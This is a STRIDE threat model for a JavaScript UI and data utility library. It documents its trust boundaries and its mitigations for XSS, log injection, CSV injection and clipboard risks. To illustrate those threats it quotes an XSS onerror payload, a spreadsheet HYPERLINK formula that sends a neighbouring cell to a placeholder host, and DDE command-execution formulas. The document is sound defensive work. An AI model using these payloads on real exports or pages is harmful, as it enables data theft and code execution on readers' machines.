# Threat model — egl-utils-js

> **Owner:** the **security-auditor** role (it drafts here; findings feed the audit risk
> register). Produced and kept current by the **audit threat-modeling sub-mode**
> (`/eados security` → `/eados audit`). Method: **STRIDE**. Scaffolded empty on purpose —
> an explicit `n/a` with a reason is honest; an unexamined boundary is not.

## 1. Scope & trust boundaries

List every boundary an attacker could stand on either side of — network edges, process/privilege
boundaries, tenancy separation, third-party services — and for each: the **untrusted inputs**
that cross it, and the **assumptions** the design makes about it.

| Boundary | Untrusted inputs crossing it | Assumptions |
|---|---|---|
| **Filter expressions** (`compileFilter`, `egl-utils-js/table`) — an end user types into a column filter box in the host application; the string reaches the library verbatim | The expression string, and the cell values it is evaluated against (server data, user data, or both) | The host calls `compileFilter` once per expression and applies the predicate per row; expressions are never persisted or shared between users as executable content; the library never reflects the expression into markup (that is the host's concern) |
| **Log records** (`logger`/`formatLogLine`, `egl-utils-js/logging`) — an application logs values it did not author: request fields, record contents, error messages, and a correlation `id` produced by an injected function | The `message` (often interpolated from user or server data), the `args`, the `name`, and the resolved `id` | The rendered line is appended to a line-oriented destination (console, file, log shipper) whose consumers treat a newline as a record separator; the host decides what is worth logging, and the library never decides that a value is safe to *store* — only that it cannot break the line format |
| **Alert messages** (`inlineAlert`, `egl-utils-js/dom`) — a message the host did not author (a server error string, a record field, a validation message) rendered into a live document | The `message` string, and — only when the caller opts in — the markup it is treated as | Text is the default and needs no trust decision: `message` is written with `textContent`, so markup in it is displayed, not parsed. Markup is reachable **only** through the explicit `{html: true, sanitize}` pair, the same required-decision contract as `injectFragment` below ([ADR-0031](../adr/0031-component-instances-and-the-alert-budget.md)), so the two HTML surfaces on this entry are governed by one rule rather than two. Class names and icons are caller-supplied and are set as class strings and text, never parsed as markup |
| **HTML fragments** (`injectFragment`, `egl-utils-js/dom`) — markup fetched from a URL at runtime and inserted into a live document | The response body (any bytes the endpoint returns, including an error page), its status, and the URL the caller passes | The caller decides, **in code at the call site**, whether the source is trusted: `sanitize` is a required option with no default, so a sanitizer or the literal `false` is always named. The library never sanitizes on its own account — it routes markup through whatever was supplied. The URL itself comes from the application, not from user input; a caller who builds it from user input owns that validation |
| **Rendered record data** (the Bootstrap element builders, `egl-utils-js/bootstrap`) — server or user records rendered into live markup at scale: badge counts, button labels, spinner status text, progress readouts, accessible names | Every caller-supplied content value (`content`, `label`, `ariaLabel`, a `format` function's return), plus the class-name inputs (`variant`, `size`, an icon `name`, the `class` option) | The builders return **nodes**, so there is no markup string for data to be interpolated into: content is written with `textContent` and names with `setAttribute`, which makes escaping structural rather than remembered ([ADR-0037](../adr/0037-builder-contract-nodes-escape-and-the-atom-budget.md)). Markup is reachable only through the same `{html: true, sanitize}` pair as `inlineAlert` and `injectFragment`, so all three HTML surfaces obey one rule. Class-name inputs are validated as CSS tokens and added through `classList`, never concatenated into an attribute string. This entry never imports the sanitizer — it is always a caller-supplied parameter, so `/bootstrap` carries no DOMPurify dependency |
| **Tabulated record data** (`bsTable`, `egl-utils-js/bootstrap`) — the same records as the row above, but rendered *per cell across a whole result set*: the widest and most repetitive path untrusted data takes through this library, and the one where a single unescaped column is enough | Every cell value (raw, or a `format` function's return), the column `label`s, the `caption`, the `empty` slot, and the `rowKey` value stamped as a `data-key` attribute | Cells inherit the F52 rules unchanged — nodes, `textContent`, `setAttribute` — so volume changes nothing about the guarantee ([ADR-0039](../adr/0039-a-facade-with-a-door-and-what-the-table-costs.md)). Markup is **per column**, not per table: `{html, sanitize}` on a column opens that column alone, so enriching a status cell cannot open the eleven columns beside it, and the header takes the *table's* rules so a rich column never reinterprets its own label. A value that is neither primitive, nullish nor a node throws a `TypeError` naming the column rather than being stringified into the page. Verified by pushing the roadmap-6.5 bypass corpus through the header, the cell, a `format` return, the caption, the `data-key` attribute and the empty slot |
| **The ambient behaviour peer** (`bsToast`/`bsModal`/`bsLoadingOverlay`, `egl-utils-js/bootstrap`) — the wrappers reach Bootstrap's JavaScript by *looking up a value*, and one of the two places they look is `globalThis.bootstrap`, a name any script running in the page can define | The namespace object itself, and therefore the constructors invoked and the instance methods called through it | This is a **same-origin** boundary, not a privilege one: a script that can define `window.bootstrap` already runs with the page's full authority and does not need this library to do anything. So the assumption is stated rather than defended — the ambient lookup is a convenience for the CDN-script deployment, and an application that wants no ambient trust at all passes `{ bootstrap }` explicitly, which takes precedence ([ADR-0041](../adr/0041-a-peer-looked-up-not-imported.md)). The library imports the peer nowhere, adds no `<script>`, and resolves no URL, so it introduces no *new* code-loading path; a namespace that does not carry the component is refused with a typed error rather than probed further |
| **The ambient sanitizer peer** (`sanitizeHtml`, `egl-utils-js/sanitize`) — since [ADR-0055](../adr/0055-the-sanitizer-s-peer-is-looked-up.md) DOMPurify is reached by *looking up a value*, and one of the two places it looks is `globalThis.DOMPurify` | The module object itself, and therefore the `sanitize` implementation every `{html: true, sanitize: sanitizeHtml}` call routes through | Same shape as the behaviour peer above, and the same answer — **same-origin, not a privilege boundary**: a script that can define `window.DOMPurify` already runs with the page's full authority and has no need of this library to defeat anything. It is called out separately because this is the *sanitizer*, where a substituted no-op would be silent rather than visible: the control is that **`options.dompurify` takes precedence over the global**, so an application that wants no ambient trust passes the module explicitly and never consults the name. The library imports the peer nowhere, adds no `<script>`, resolves no URL, and refuses a value that is neither a factory nor a bound sanitizer with a typed error rather than probing it further |
| **Exported files** (`tableCsv`, `egl-utils-js/table`) — record data leaves the application as a file, and the program that opens it **executes some cell contents**. The consumer is out of the host's control: a spreadsheet on someone else's machine, often someone who was emailed the export | Every exported cell value (raw, or a `text`/`format` return), every column heading, and the delimiter/newline the caller chose | The file is opened by a spreadsheet unless the caller says otherwise, so the dangerous default is assumed rather than hoped against. The library produces **text only** — no `Blob`, no download, no filename, no MIME type — so it neither names the file nor decides how it travels; both are the host's. Who may export which rows stays the host's authorization decision, applied before the rows arrive ([ADR-0066](../adr/0066-a-csv-is-not-an-inert-document.md)) |
| **The system clipboard** (`copyToClipboard`, `egl-utils-js/dom`) — a write to a surface shared with **every other application on the machine**, and the only boundary in this library that leaves the browser entirely | The text the caller passes, and — from the other direction — the platform's permission decision and secure-context state | Write-only, one string at a time, and never read: nothing here reads the clipboard, so no other application's data crosses into the page. The write is permission-gated by the platform and the library adds no way around that gate; a refusal is surfaced typed rather than retried or worked around ([ADR-0066](../adr/0066-a-csv-is-not-an-inert-document.md)) |
| _e.g. public HTTP edge_ | _request bodies, headers, auth tokens_ | _TLS terminated upstream_ |

## 2. STRIDE pass

Work the six categories (**S**-**T**-**R**-**I**-**D**-**E**) **per boundary/component** above.
Every cell gets an entry — a threat, a mitigation, or an explicit `n/a (reason)`; never a blank.

| Category | Threat considered | Boundary / component | Mitigation / control | Status |
|---|---|---|---|---|
| Spoofing — is the caller who it claims? | n/a — the primitive has no notion of identity and performs no authentication | Filter expressions | n/a (reason: pure function of its arguments) | ☑ |
| Tampering — can data/code be altered in flight or at rest? | An expression could inject executable behaviour if it were compiled to code | Filter expressions | No `eval`, no `Function`, and **no `RegExp` is constructed from the expression** — it is dispatched on a leading token and evaluated with `includes`/`startsWith`/`endsWith`/numeric comparison ([ADR-0021](../adr/0021-filter-expression-grammar.md)). Custom operators are supplied by the host in code, never by the expression | ☑ |
| Repudiation — can an action be denied for lack of a trail? | n/a — filtering is a read-side transform that changes no state and produces no auditable action | Filter expressions | n/a (reason: no side effects) | ☑ |
| Information disclosure — can data leak across a boundary? | A crafted expression could probe values the user should not see | Filter expressions | The predicate only answers yes/no about values the host already passed it; it reads nothing else and returns no data. Which rows a user may see remains the host's authorization decision, applied before filtering | ☑ |
| Denial of service — can the surface be exhausted? | **The realistic threat.** A pathological expression evaluated per row per keystroke could be made superlinear — the ReDoS shape | Filter expressions | No backtracking engine is involved at all; evaluation is O(\|value\| + \|expression\|) with no nesting. Expressions past 1024 code units stop being parsed as a grammar and match literally, so a very long input cannot even select a code path (NFR-09). Normalization happens once at compile time, not per row. Asserted by a fast-check totality property over arbitrary Unicode | ☑ |
| Elevation of privilege — can a caller gain authority it was not granted? | n/a — the module has no privileged operation, no I/O, and touches no platform global | Filter expressions | n/a (reason: pure, Node-safe, zero-capability surface) | ☑ |
| Spoofing — is the caller who it claims? | **Log injection.** A newline inside any interpolated field lets attacker-controlled text pose as a *separate log record* — a forged `ERROR` line, a fake audit entry, or a value that shifts every downstream parser's column alignment | Log records | Every field interpolated into a line — `message`, `name`, and `id` — has its CR/LF runs collapsed to a single space, so one record renders as exactly one line for **every** input ([ADR-0027](../adr/0027-logging-formatter-sink-split.md)). The guarantee is asserted by a fast-check property over arbitrary strings, not by examples, and again in the browser suite. The `id` is covered deliberately: it arrives from an injected function, so it is no more trusted than the message | ☑ |
| Tampering — can data/code be altered in flight or at rest? | A record could carry executable content, or a hostile value could hijack formatting through `toString` | Log records | Formatting only ever produces a string: no `eval`, no `Function`, no markup, no `RegExp` built from record content. A `toString` that throws is caught, costs that one record, and is reported once — it cannot abort the caller (`ADR-0027`). Structured `args` are passed to the sink untouched rather than interpolated | ☑ |
| Repudiation — can an action be denied for lack of a trail? | **The trail itself is the asset.** A failing sink that threw would take the surrounding `catch` block with it — destroying the error being recorded — or, worse, silently drop records while appearing healthy | Log records | Record construction and dispatch sit inside one `try`: a dead transport, throwing clock, or throwing id function costs that single record and is reported once through `console.error`, so a gap is visible rather than silent, and the original application error still propagates. The library makes no completeness or durability claim beyond that — a durable audit trail is the host's sink | ☑ |
| Information disclosure — can data leak across a boundary? | The genuine risk is the host logging secrets (tokens, PII) and the library widening their reach | Log records | The library adds no destination of its own: with no `sink` it writes to `console` and nothing else — no network, no file, no storage. It performs **no redaction** and claims none; deciding what may be logged stays with the caller, and a redacting `format` or `sink` is the injection point for it. `pageSessionId`, the intended `id` source, is a correlation id and explicitly not a credential ([ADR-0024](../adr/0024-page-session-id-scope-and-budget.md)) | ☑ |
| Denial of service — can the surface be exhausted? | A very large message or arg array could make formatting expensive per record; a `silent` logger could still pay for building records | Log records | The threshold check runs **before** anything is built — below-threshold calls read no clock, resolve no id, allocate no record. Formatting is a single linear pass with no backtracking (CR/LF collapse) and fixed-width columns bound the metadata portion. Volume control (rate limiting, sampling, batching) belongs to the sink and is out of scope here | ☑ |
| Elevation of privilege — can a caller gain authority it was not granted? | n/a — the module holds no privileged capability: no I/O beyond an optional `console` write, no platform global other than `console`, and no state shared between instances (a module-level default logger was rejected precisely to avoid shared mutable configuration) | Log records | n/a (reason: no privileged operation to gain; see the Singleton rejection in [ADR-0027](../adr/0027-logging-formatter-sink-split.md)) | ☑ |
| Spoofing — is the caller who it claims? | n/a — `injectFragment` performs no authentication; it issues a plain `fetch` and inherits whatever ambient credentials the caller's `fetch` and cookie policy provide | HTML fragments | n/a (reason: no identity is asserted or checked. Callers needing an authenticated fragment inject their own `fetch`, the same seam `httpClient` uses for bearer auth without storing a token, [ADR-0007](../adr/0007-http-client-facade-contract.md)) | ☑ |
| Tampering — can data/code be altered in flight or at rest? | **The realistic threat: XSS.** Markup from a compromised or attacker-influenced endpoint reaching `innerHTML` executes with the page's full authority — scripts, event-handler attributes, `javascript:` URLs, and the mXSS shapes the sanitize corpus covers | HTML fragments | `sanitize` is a **required** option with no default, so the trust decision is made in code and is greppable ([ADR-0030](../adr/0030-sanitize-is-a-required-parameter.md)): a sanitizer (typically `sanitizeHtml`, whose deny-by-default allowlist is [ADR-0012](../adr/0012-sanitize-default-profile.md)) or the literal `false` to state the source is trusted. Neither candidate default was acceptable — sanitizing by default would drag the DOMPurify optional peer into every `/dom` import, and not sanitizing by default would make the dangerous path the quiet one. The sanitizer's return value must be a string, so a mis-wired sanitizer fails loudly rather than injecting an object's `toString` | ☑ |
| Repudiation — can an action be denied for lack of a trail? | A silent failure would leave a half-rendered page indistinguishable from a complete one, so a caller could not tell what actually got injected | HTML fragments | Every error **propagates**: a non-2xx rejects with `HttpError` carrying status and body, and a network failure or abort rejects with the original error. Nothing is caught, no dialog is shown, and no `console.error` swallow exists — a caller assembling a shell from several fragments can attribute a partial render (ADR-0030). The library keeps no log of its own; recording the attempt is the caller's, with `/logging` available for it | ☑ |
| Information disclosure — can data leak across a boundary? | A fragment URL could be pointed at an endpoint whose response should not reach the page, or credentials could ride along to a third party | HTML fragments | The URL is passed to `fetch` **exactly as given** — no base is prepended, no redirect policy is overridden, and nothing is read from `location`; the request's credential behaviour is `fetch`'s default or the injected implementation's. The library adds no destination of its own and reads nothing from the response beyond its text. Restricting which origins may be fetched is the host's concern, best expressed as a Content Security Policy (`connect-src`) rather than a library allowlist that would duplicate it badly | ☑ |
| Denial of service — can the surface be exhausted? | A very large fragment, or a slow endpoint, could stall a render | HTML fragments | Cancellation is first-class: `signal` passes straight to `fetch`, so a caller's timeout or an unmounted component aborts the request and the rejection surfaces rather than injecting late. No retry loop, no queue, and no response-size limit are imposed — bounding those belongs to the caller's transport (`timeout`/`retry` compose from the root entry), which keeps this function one decision wide | ☑ |
| Tampering — can data/code be altered in flight or at rest? | **XSS through a message nobody thought of as markup.** An error string or record field containing `<img src=x onerror=…>` is the classic path, and it is easy to ship because the value looks like text at the call site | Alert messages | The default renders through `textContent`, so that payload is *displayed* rather than executed and no trust decision is needed for the common case. The dangerous path is opt-in and cannot be reached by accident: `{html: true}` without `sanitize` throws, exactly as `injectFragment` does ([ADR-0031](../adr/0031-component-instances-and-the-alert-budget.md)), and a sanitizer returning a non-string fails loudly. The icon slot takes the same care — a string icon is set as text, and a node icon is cloned rather than parsed | ☑ |
| Elevation of privilege — can a caller gain authority it was not granted? | Injected markup runs with the page's origin and privileges, so this boundary is the one place in the library where untrusted bytes can become executing code | HTML fragments | The only path to execution is markup the caller either sanitized or explicitly declared trusted; there is no `eval`, no `Function`, no script injection of the library's own. `insertAdjacentHTML` is used for non-replace positions so existing nodes and their listeners are not re-parsed — which is a correctness property, not a security one, and is noted here so it is not mistaken for a mitigation | ☑ |
| Spoofing — is the caller who it claims? | n/a — the builders assert no identity and perform no I/O; they turn arguments into detached nodes | Rendered record data | n/a (reason: no identity is asserted or checked, and no request is issued) | ☑ |
| Tampering — can data/code be altered in flight or at rest? | **XSS at scale.** This is the defect class the toolkit exists to replace: the prevailing way to render Bootstrap markup is a template literal assigned to `innerHTML`, and a record field containing `"><img src=x onerror=…>` breaks out of it every time. Rendering many records multiplies the exposure — one unescaped column is enough | Rendered record data | There is **no markup string to break out of**: builders create nodes and write content through `textContent`/`setAttribute`, so the payload is displayed rather than parsed and escaping cannot be forgotten at a call site ([ADR-0037](../adr/0037-builder-contract-nodes-escape-and-the-atom-budget.md)). Markup requires the explicit `{html: true, sanitize}` pair — omitting `sanitize` throws, and a sanitizer returning a non-string fails loudly — matching `inlineAlert` and `injectFragment` exactly. An icon supplied as a node is **cloned**, never re-parsed. Class-name inputs are tokenised and added via `classList`, so a hostile `variant` is rejected as a `TypeError` before the DOM sees it, and a hostile icon name can only ever be an inert class token. Verified by pushing the roadmap-6.5 bypass corpus through every content-accepting option of every builder and asserting inertness — including a re-parse of `outerHTML`, which closes the serialize-then-reparse (mXSS) class those payloads are drawn from | ☑ |
| Repudiation — can an action be denied for lack of a trail? | n/a — a builder produces a detached node and changes no state; there is no action to deny | Rendered record data | n/a (reason: no side effects, no persistence, no I/O. Whether a render is recorded is the host's concern, with `/logging` available) | ☑ |
| Information disclosure — can data leak across a boundary? | A builder could widen the reach of data it was handed — by fetching, by storing, or by rendering a value the caller did not pass | Rendered record data | The builders have **no destination**: no network, no storage, no platform global beyond the document they are given. They render exactly what they receive and read nothing else — notably not `location`, not cookies, not storage. Which records a user may see stays the host's authorization decision, made before rendering | ☑ |
| Denial of service — can the surface be exhausted? | A very large content value or a very high `lines`/`widths` count could make one render expensive | Rendered record data | Each builder is a bounded, single-pass construction with no loops over caller data beyond the counts it is given, no backtracking, and no `RegExp` built from caller input (the class tokeniser splits on a fixed whitespace pattern). Multi-node population batches through one `DocumentFragment`, so N lines cost one insertion rather than N. Bounding how much a host chooses to render — pagination, virtualisation — belongs to the host, and `paginate`/`tablePipeline` compose for it | ☑ |
| Elevation of privilege — can a caller gain authority it was not granted? | Markup rendered into the page runs with its origin, so an escape failure here would be an origin-level compromise | Rendered record data | The only path to executing content is the explicit, sanitized-or-declared-trusted `{html, sanitize}` pair; the library contains no `eval`, no `Function`, and constructs no script or style node. The optional `bootstrap` peer is untouched by every builder in this milestone, so this surface adds no third-party code path at all (NFR-18) | ☑ |
| Spoofing — is the caller who it claims? | n/a — serialization asserts no identity and performs no I/O; it turns rows into a string | Exported files | n/a (reason: pure function of its arguments, no request issued) | ☑ |
| Tampering — can data/code be altered in flight or at rest? | **CSV injection, and it is the reason this boundary exists.** Every mainstream spreadsheet evaluates a cell whose text begins `=`, `+`, `-` or `@`, so a record field containing `=HYPERLINK("http://x/?"&A1,"click")` exfiltrates the row beside it on open, and `=cmd\|'/C calc'!A0` historically did worse. The data is almost never the exporter's own | Exported files | Those leading characters are **neutralized by default** with a `'` prefix — the marker spreadsheets themselves use for "this is text" — with one exception that keeps the mitigation from being switched off wholesale: a field whose *whole text* is a finite number is left alone, because `-5` is data and prefixing every negative number would corrupt whole columns to buy nothing. `-2+3+cmd\|'/C calc'!A0` is not a number and is defused. Headers get the same treatment, since a `label` can come from data. Quoting is **not** a mitigation and is not mistaken for one: spreadsheets strip the quotes before evaluating. Defeatable by one greppable option for a caller whose consumer is a parser ([ADR-0066](../adr/0066-a-csv-is-not-an-inert-document.md)) | ☑ |
| Repudiation — can an action be denied for lack of a trail? | n/a — producing a string changes no state and performs no action to deny | Exported files | n/a (reason: no side effects, no persistence. Whether an export is recorded is the host's, with `/logging` available) | ☑ |
| Information disclosure — can data leak across a boundary? | **The realistic risk, and it is mostly the host's.** An export is a copy of records leaving the application's access controls entirely — the file outlives the session, the permission check and the tenant | Exported files | The library exports **exactly the rows and columns it is handed** and reads nothing else: no source, no pipeline, no `location`, no storage, and no destination of its own. Which rows a user may export is the host's authorization decision, taken before the call — and because the function receives rows rather than a query, a host that filtered correctly for display has already filtered correctly for export. The injection mitigation above is itself an anti-exfiltration control: the classic payload's purpose is reading a neighbouring cell and sending it | ☑ |
| Denial of service — can the surface be exhausted? | A very large result set, or a pathological field, could make one serialization expensive | Exported files | One linear pass per field, no backtracking, no `RegExp` built from caller data (the risky-prefix test is a `Set` lookup on one character, and the numeric test is `Number()`). Cost is O(total characters). Bounding how much a host chooses to export belongs to the host, and `paginate`/`tablePipeline` compose for it — the function takes an array, so exporting a page instead of a million rows is a different argument, not a different function | ☑ |
| Elevation of privilege — can a caller gain authority it was not granted? | The injection payload's whole purpose is gaining execution in the reader's spreadsheet, which is a *different* trust domain from the page | Exported files | No `eval`, no `Function`, no markup, and no code path of the library's own. The authority at stake is the reader's spreadsheet, and the control is the neutralization above; there is no privileged operation on this side to gain | ☑ |
| Spoofing — is the caller who it claims? | n/a — the write asserts no identity; the platform gates it by origin and user permission, neither of which the library influences | The system clipboard | n/a (reason: no identity is asserted or checked) | ☑ |
| Tampering — can data/code be altered in flight or at rest? | Clipboard content is pasted into other applications, so a payload could be aimed at whatever the user pastes into — a terminal, a spreadsheet, an editor | The system clipboard | The text is the caller's and is written verbatim: this function adds nothing, strips nothing, and claims no sanitization. Where the text is an export, the CSV boundary above is what neutralizes the spreadsheet case — the same string, one mitigation, applied where it is meaningful rather than twice. A caller writing arbitrary text owns its content, which is stated in the API docs rather than implied | ☑ |
| Repudiation — can an action be denied for lack of a trail? | **The failure mode this requirement exists for.** A copy that did nothing looks exactly like a copy that worked, so neither the user nor the application can tell what is on the clipboard | The system clipboard | Every refusal is a typed `ClipboardError` (`EGL_CLIPBOARD`) with a `reason` that distinguishes `'insecure'` (fixable by serving over HTTPS) from `'denied'` (the user's to grant) from `'unsupported'` from `'failed'` (platform error in `cause`). Nothing is caught and swallowed, and there is **no `execCommand` fallback** — a fallback would restore precisely the ambiguity being removed | ☑ |
| Information disclosure — can data leak across a boundary? | The clipboard is readable by other applications and by any page the user later pastes into, so writing is itself a disclosure — and *reading* it would be a disclosure into the page | The system clipboard | Write-only by construction: `readText` is never called, so no other application's clipboard data can enter the page through this library. The write is the caller's deliberate act and the platform gates it; what goes on the clipboard is the caller's decision, taken with the same care as an export | ☑ |
| Denial of service — can the surface be exhausted? | A very large string, or a loop of writes, could stress the platform's clipboard | The system clipboard | One `writeText` per call, awaited, with no retry and no queue: a caller who loops is issuing the loop. Size limits are the platform's and are surfaced as a `'failed'` rejection with the platform error as `cause` rather than absorbed | ☑ |
| Elevation of privilege — can a caller gain authority it was not granted? | Clipboard access is a permission, so a bypass would be an escalation out of the browser's own gate | The system clipboard | No bypass is attempted: the API is called through the injected or ambient `navigator`, a missing one is reported rather than routed around, and the deprecated `execCommand` path — which historically worked without permission — is deliberately not implemented. The library adds no `<script>`, resolves no URL, and reaches no global beyond `navigator` and `isSecureContext`, both inventoried under the NFR-07 floor gate ([ADR-0017](../adr/0017-platform-api-floor-gate.md)) | ☑ |

### The ambient behaviour peer (`bsToast`, `bsModal`, `bsLoadingOverlay`)

| Question | Threat | Asset | Mitigation / decision | Status |
|---|---|---|---|---|
| Spoofing — is the caller who it claims? | A script could define `window.bootstrap` as an impostor, and the wrappers would call it | The Bootstrap namespace | Not defensible from inside a page, and not this library's boundary to hold: any script able to set that global already executes with the origin's full authority — it can replace `Element.prototype.appendChild` just as easily. What the library *does* control is that it never widens the attack surface: no import, no injected `<script>`, no URL resolved, no `eval`. An application unwilling to trust an ambient name passes `{ bootstrap }`, which always wins | ☑ |
| Tampering — can data/code be altered in flight or at rest? | Toast content is caller data rendered into a live document | Rendered record data | Unchanged from F52: `renderContent` writes `textContent`, and markup needs the explicit `{html: true, sanitize}` pair. The toast adds a live-region role and a dismiss control, neither of which is caller markup | ☑ |
| Repudiation — can an action be denied for lack of a trail? | n/a — the wrappers show and hide UI; they persist nothing | UI state | n/a (reason: no state outlives the page, and the host's own logging decides what a dialog interaction is worth recording) | ☑ |
| Information disclosure — can data leak across a boundary? | A wrapper could send what it was shown somewhere | Toast/overlay content | No destination exists: no network call, no storage write, no read of `location`, cookies or storage. The peer object is invoked, never handed the caller's content beyond the node it is asked to drive | ☑ |
| Denial of service — can the surface be exhausted? | Unbounded `show()` calls could accumulate toasts, or a never-released overlay could pin the page | DOM/session | Each toast disposes itself and leaves the DOM on `hidden.bs.toast`, so a long-running page does not accumulate hidden markup; `destroy()` and an aborted `signal` clear every live one at once. The overlay's reference count is what prevents a stuck overlay from *concurrency* — the classic cause — and `destroy()` bypasses the minimum-visible floor deliberately so teardown is never delayed by it. How often an application toasts is the application's budget | ☑ |
| Elevation of privilege — can a caller gain authority it was not granted? | Resolving a peer is the one place this entry calls third-party code | The Bootstrap namespace | The only authority obtained is Bootstrap's own, in a page that already loaded Bootstrap. Resolution is **lazy**, so an application that never opens a dialog never touches the peer at all; a missing or incomplete namespace is a typed `EGL_PEER_MISSING` refusal rather than a fallback, so there is no degraded path to be steered onto ([ADR-0041](../adr/0041-a-peer-looked-up-not-imported.md)) | ☑ |

## 3. Findings → the risk register

A threat that survives analysis lands in the audit **risk register** with its severity
(low/medium/high/critical), affected component, realistic impact, and a concrete mitigation — the
same record shape the audit phase emits. A confirmed, reproducible defect additionally becomes a
[bug-ledger](../bugs/README.md) record; a vulnerability needing coordinated disclosure becomes a
**draft** advisory the human publishes.

### Standing risk: the delegated sanitizer's version

| Severity | Component | Realistic impact | Mitigation |
|---|---|---|---|
| medium | `sanitizeHtml` (`egl-utils-js/sanitize`) | The library delegates sanitization to DOMPurify (ADR-0012), so a bypass in the peer is a bypass in every `{html: true, sanitize: sanitizeHtml}` call the host makes. The version installed is the consumer's choice, not ours | Two-part, and deliberately not one part ([ADR-0051](../adr/0051-the-sanitizer-s-peer-range.md)). The **declared peer range** (`^3.4.13`) excludes every version known vulnerable when 1.0 froze it — a one-time act, because raising a peer floor is breaking and this project will not ship a major per advisory. Everything after that is the **consumer's to patch**, which they can, because they own the dependency; `SECURITY.md` states it where they read it. On this side, the CI audit gate runs at `--audit-level moderate` so a DOMPurify advisory is visible *here* too — it is the one finding in this tree that can mean `sanitizeHtml`'s own configuration (its pinned `IN_PLACE: false`, `RETURN_DOM: false`, allowlist) needs to change |

Recorded as a standing risk rather than closed: it has no end state. The boundary itself is
unchanged — the sanitizer is still a caller-supplied parameter everywhere but this entry — so
what is new is the *policy* about the peer's version, not a new untrusted input.

**Amended in 17.6 ([ADR-0055](../adr/0055-the-sanitizer-s-peer-is-looked-up.md)):** *how* the
peer is reached did change, and it added the ambient-sanitizer row above. Two consequences
belong in this register rather than only in the ADR. First, a packaging mistake that the
previous static import would have failed at **build** time now surfaces at the first sanitize
call — later, but still as a typed `EGL_PEER_MISSING`, and never as a pass-through of
unsanitized HTML (asserted directly, not argued). Second, the reachable-but-wrong case is now
possible at all, and is refused: a value that is neither a factory nor a bound sanitizer is a
`TypeError` naming the shape, so a mis-wired peer cannot silently become a no-op sanitizer.
